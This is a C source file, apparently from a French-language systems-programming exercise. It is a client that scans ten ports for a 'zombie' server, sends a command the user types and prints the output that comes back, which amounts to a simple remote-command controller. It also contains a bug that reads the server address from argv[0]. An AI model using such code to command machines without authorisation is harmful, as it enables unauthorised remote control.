#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "messages.h"
#include "utils_v2.h"

/**
 * Returns sockfd or a negative number if there was an error creating the connection.
 */
int initSocketClient(char * serverIP, int serverPort)
{
  int sockfd = ssocket();
  struct sockaddr_in addr;
  memset(&addr,0,sizeof(addr)); /* en System V */
  addr.sin_family = AF_INET;
  addr.sin_port = htons(serverPort);
  inet_aton(serverIP,&addr.sin_addr);
  int ret = connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
  if(ret < 0) return ret;
  return sockfd;
}


int main(int argc, char **argv)
{
  char* serverIP = argv[0];

  int possiblePorts[10] = {SERVER_PORT_1, SERVER_PORT_2, SERVER_PORT_3, SERVER_PORT_4, 
        SERVER_PORT_5, SERVER_PORT_6, SERVER_PORT_7, SERVER_PORT_8,
        SERVER_PORT_9, SERVER_PORT_10};

  int sockfd;
  int port;

  // Essai de tous les ports possibles
    for(int i = 0; i < 10; i++){
        port = possiblePorts[i];
        sockfd = initSocketClient(serverIP, port);
        if(sockfd > 0) break;
    }
    printf("Zombie trouvé sur le port %d \n\n", port);


  printf("Entrez une commande à envoyer au(x) zombie(s) :\n");
  StructMessage msg;
  int ret = sread(0, msg.messageText, MAX_LENGTH);
  msg.messageText[ret - 1] = '\0';
  msg.code = COMMAND_MESSAGE;


  int fdstdin = dup(0);
  dup2(sockfd, 0);

  
  swrite(sockfd, &msg, sizeof(msg));

  /* wait server response */
  //sread(sockfd, &msg, sizeof(msg));

  char buf[1024];
  ssize_t n;
  while ((n = read(sockfd, buf, sizeof(buf))) > 0) {
      nwrite(1, buf, n);
  }

  /*
  if (msg.code == RESULT_MESSAGE)
  {
    printf("Réponse du serveur : Inscription acceptée\n");
  }
  */

  // sread(1, nom, nbchar) pour lire le contenu sur la sortie standard
  // POLLIN pour éviter que sread ne bloque d'autres sread
  // fork_and_run0(lireReponse);

  // traitement parent envoyer les commandes

  
  dup2(fdstdin,0);
  sclose(fdstdin);

  sclose(sockfd);
  return 0;
}
